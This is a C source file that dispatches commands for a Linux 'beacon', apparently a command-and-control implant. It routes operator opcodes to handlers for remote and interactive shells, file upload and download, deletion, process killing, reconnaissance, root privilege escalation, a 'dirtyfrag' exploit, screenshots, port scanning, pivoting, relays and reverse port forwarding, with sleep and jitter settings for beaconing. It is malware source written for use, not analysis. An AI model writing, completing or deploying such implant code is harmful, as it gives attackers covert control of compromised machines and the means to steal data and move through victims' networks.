// Command dispatch router for the Linux beacon.
// Routes opcodes to command handlers.

#include "beacon.h"
#include <string.h>
#include <stdio.h>

// Forward declarations of command handlers
void cmd_shell(const BeaconTask* t);
void cmd_cd(const BeaconTask* t);
void cmd_pwd(const BeaconTask* t);
void cmd_ls(const BeaconTask* t);
void cmd_rm(const BeaconTask* t);
void cmd_cp(const BeaconTask* t);
void cmd_mv(const BeaconTask* t);
void cmd_upload(const BeaconTask* t);
void cmd_download(const BeaconTask* t);
void cmd_cat(const BeaconTask* t);
void cmd_mkdir_cmd(const BeaconTask* t);
void cmd_chmod_cmd(const BeaconTask* t);
void cmd_ps(const BeaconTask* t);
void cmd_kill(const BeaconTask* t);
void cmd_whoami(const BeaconTask* t);
void cmd_hostname(const BeaconTask* t);
void cmd_id(const BeaconTask* t);
void cmd_env(const BeaconTask* t);
void cmd_ifconfig(const BeaconTask* t);
void cmd_ishell(const BeaconTask* t);
void cmd_tcp_pivot(const BeaconTask* t);
void cmd_privesc_root(const BeaconTask* t);
void cmd_dirtyfrag(const BeaconTask* t);
void cmd_screenshot(const BeaconTask* t);
void cmd_relay_start(const BeaconTask* t);
void cmd_relay_stop(const BeaconTask* t);
void cmd_relay_resp(const BeaconTask* t);
void cmd_rportfwd_open(const BeaconTask* t);
void cmd_rportfwd_data(const BeaconTask* t);
void cmd_rportfwd_close(const BeaconTask* t);
void cmd_portscan(const BeaconTask* t);

void cmd_dispatch(const BeaconTask* t) {
    switch (t->op) {
    case OP_NOOP:
        out_begin(t->id, RESP_ACK);
        out_mark_done();
        break;

    case OP_SLEEP: {
        // payload: [u32 BE sleep_ms][u8 jitter_pct] — 5 binary bytes
        if (t->pay && t->pay_len >= 5) {
            uint32_t ms = ((uint32_t)t->pay[0] << 24)
                        | ((uint32_t)t->pay[1] << 16)
                        | ((uint32_t)t->pay[2] <<  8)
                        |  (uint32_t)t->pay[3];
            uint8_t j = t->pay[4];
            if (ms > 0) beacon_state()->sleep_ms = ms;
            if (j <= 100) beacon_state()->jitter_pct = j;
        }
        out_begin(t->id, RESP_OUTPUT);
        char msg[64];
        int n = snprintf(msg, sizeof(msg), "sleep %u ms, jitter %u%%\n",
                         (unsigned)beacon_state()->sleep_ms,
                         (unsigned)beacon_state()->jitter_pct);
        out_write(msg, (size_t)n);
        break;
    }

    case OP_EXIT:
        beacon_state()->quit = 1;
        out_begin(t->id, RESP_OUTPUT);
        out_write("exiting\n", 8);
        break;

    case OP_SHELL:  cmd_shell(t);  break;
    case OP_ISHELL: cmd_ishell(t); break;
    case OP_PS:    cmd_ps(t);    break;

    case OP_UPLOAD:   cmd_upload(t);   break;
    case OP_DOWNLOAD: cmd_download(t); break;
    case OP_LS:       cmd_ls(t);       break;
    case OP_CD:       cmd_cd(t);       break;
    case OP_PWD:      cmd_pwd(t);      break;
    case OP_RM:       cmd_rm(t);       break;
    case OP_CP:       cmd_cp(t);       break;
    case OP_MV:       cmd_mv(t);       break;
    case OP_CAT:      cmd_cat(t);      break;
    case OP_MKDIR:    cmd_mkdir_cmd(t); break;
    case OP_CHMOD:    cmd_chmod_cmd(t); break;
    case OP_ENV:      cmd_env(t);      break;
    case OP_WHOAMI:   cmd_whoami(t);   break;
    case OP_ID:       cmd_id(t);       break;
    case OP_HOSTNAME: cmd_hostname(t); break;
    case OP_IFCONFIG: cmd_ifconfig(t); break;
    case OP_KILL:     cmd_kill(t);     break;
    case OP_TCP_PIVOT:    cmd_tcp_pivot(t);    break;
    case OP_PRIVESC_ROOT: cmd_privesc_root(t); break;
    case OP_DIRTYFRAG:    cmd_dirtyfrag(t);    break;
    case OP_SCREENSHOT:   cmd_screenshot(t);   break;

    case OP_PORTSCAN:     cmd_portscan(t);     break;

    case OP_RELAY_START:  cmd_relay_start(t);  break;
    case OP_RELAY_STOP:   cmd_relay_stop(t);   break;
    case OP_RELAY_RESP:   cmd_relay_resp(t);   out_mark_done(); break;

    case OP_RPORTFWD_OPEN:  cmd_rportfwd_open(t);  out_mark_done(); break;
    case OP_RPORTFWD_DATA:  cmd_rportfwd_data(t);  out_mark_done(); break;
    case OP_RPORTFWD_CLOSE: cmd_rportfwd_close(t); out_mark_done(); break;

    default: {
        out_begin(t->id, RESP_ERROR);
        char errmsg[64];
        int elen = snprintf(errmsg, sizeof(errmsg), "unknown opcode %u\n", (unsigned)t->op);
        out_write(errmsg, (size_t)elen);
        break;
    }
    }
}
